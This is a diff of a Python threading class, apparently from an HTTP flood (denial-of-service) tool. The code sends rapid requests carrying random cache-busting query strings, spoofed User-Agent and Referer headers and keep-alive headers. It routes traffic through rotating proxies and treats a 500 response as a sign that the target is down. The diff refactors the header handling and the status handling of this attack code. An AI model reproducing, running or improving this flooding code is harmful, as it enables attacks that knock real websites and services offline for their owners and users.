@@ -161,74 +161,44 @@ class httpcall(threading.Thread):
                             lres = requests.request(self.method,f"{useurl}{param_joiner}{buildblock(random.randint(3,10))}={buildblock(random.randint(3,10))}",headers=header, timeout=self.timeout)
                         #print(lres.text)
                         #proxies.append(proxy)
-                        if str(lres.status_code).startswith("50"):
-                            set_flag(1)
-                            print("Res 500 "+usehost)
-                            s = useurl
-                            b = usehost
-                            url.remove(s)
-                            host.remove(b)
-                        elif isignorestatus(lres.status_code):
-                            requestcnt()
-                        else:
-                            print("A request error has occurred. "+str(lres.status_code)+" at "+usehost)
-                            s = useurl
-                            b = usehost
-                            url.remove(s)
-                            host.remove(b)
                     except Exception as e:
                         #print(e)
                         if len(url) == 0:
                             set_flag(2)
+                        continue
                 else:
                     try:
                         if self.usepayload == True:
-                            lres = requests.request(self.method,f"{useurl}{param_joiner}{buildblock(random.randint(3,10))}={buildblock(random.randint(3,10))}",headers={
-                                "User-Agent": random.choice(self.useragents),
-                                "Cache-Control": "no-cache",
-                                "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
-                                "content-type": "application/json",
-                                "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
-                                "Keep-Alive": str(random.randint(110,120)),
-                                "Connection": "keep-alive",
-                                "Host": usehost
-                            }, data=self.payload, timeout=self.timeout, proxies={
+                            lres = requests.request(self.method,f"{useurl}{param_joiner}{buildblock(random.randint(3,10))}={buildblock(random.randint(3,10))}",headers=header, data=self.payload, timeout=self.timeout, proxies={
                                 "http":"http://"+proxy,
                                 "https":"http://"+proxy,
                             })
                         else:
-                            lres = requests.request(self.method,f"{useurl}{param_joiner}{buildblock(random.randint(3,10))}={buildblock(random.randint(3,10))}",headers={
-                                "User-Agent": random.choice(self.useragents),
-                                "Cache-Control": "no-cache",
-                                "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
-                                "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
-                                "Keep-Alive": str(random.randint(110,120)),
-                                "Connection": "keep-alive",
-                                "Host": usehost
-                            }, timeout=self.timeout, proxies={
+                            lres = requests.request(self.method,f"{useurl}{param_joiner}{buildblock(random.randint(3,10))}={buildblock(random.randint(3,10))}",headers=header, timeout=self.timeout, proxies={
                                 "http":"http://"+proxy,
                                 "https":"http://"+proxy,
                             })
                         proxies.append(proxy)
-                        if str(lres.status_code).startswith("50"):
-                            #set_flag(1)
-                            print("Res 500 "+usehost)
-                            s = useurl
-                            b = usehost
-                            url.remove(s)
-                            host.remove(b)
-                        elif isignorestatus(lres.status_code):
-                            requestcnt()
-                        else:
-                            print("A request error has occurred. "+str(lres.status_code)+" at "+usehost)
-                            s = useurl
-                            b = usehost
-                            url.remove(s)
-                            host.remove(b)
                     except Exception as e:
                         #print(e)
                         if len(url) == 0:
                             set_flag(2)
+                        continue
+                if str(lres.status_code).startswith("50"):
+                    set_flag(1)
+                    print("Res 500 "+usehost)
+                    s = useurl
+                    b = usehost
+                    url.remove(s)
+                    host.remove(b)
+                elif isignorestatus(lres.status_code):
+                    requestcnt()
+                else:
+                    print("A request error has occurred. "+str(lres.status_code)+" at "+usehost)
+                    s = useurl
+                    b = usehost
+                    url.remove(s)
+                    host.remove(b)
             if self.nodelay == True:
                 continue
             elif self.limiter == True:
